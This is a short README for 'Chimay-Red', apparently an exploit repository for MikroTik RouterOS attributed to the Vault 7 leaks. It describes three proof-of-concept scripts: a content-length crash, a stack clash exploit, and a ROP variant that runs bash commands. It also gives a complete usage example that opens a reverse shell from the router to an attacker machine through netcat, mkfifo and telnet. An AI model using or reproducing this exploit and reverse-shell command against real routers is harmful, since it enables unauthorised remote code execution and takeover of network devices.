# Chimay-Red
POC of Mikrotik exploit from Vault 7 CIA Leaks

See the PDF for more info

### Proof of concepts
# CrashPOC  
Simple crash sending -1 as content-length in post header 

# StackClashPOC  
Stack clash exploit using two threads, missing ROP chain

# StackClashROPSystem  
Run bash commands  
For a reverse shell:  
```
$ nc -l -p 1234
$ ./StackClashROPsystem.py 192.168.8.1 www_binary "mkfifo /tmp/f && /bin/telnet 192.168.8.5 1234 < /tmp/f | /bin/bash 
 > /tmp/f 2>&1"
```
Where:  
- RouterOS IP: 192.168.8.1  
- PC IP: 192.168.8.5  

(You have to extract the www binary from the RouterOS firmware, check that the version is correct)
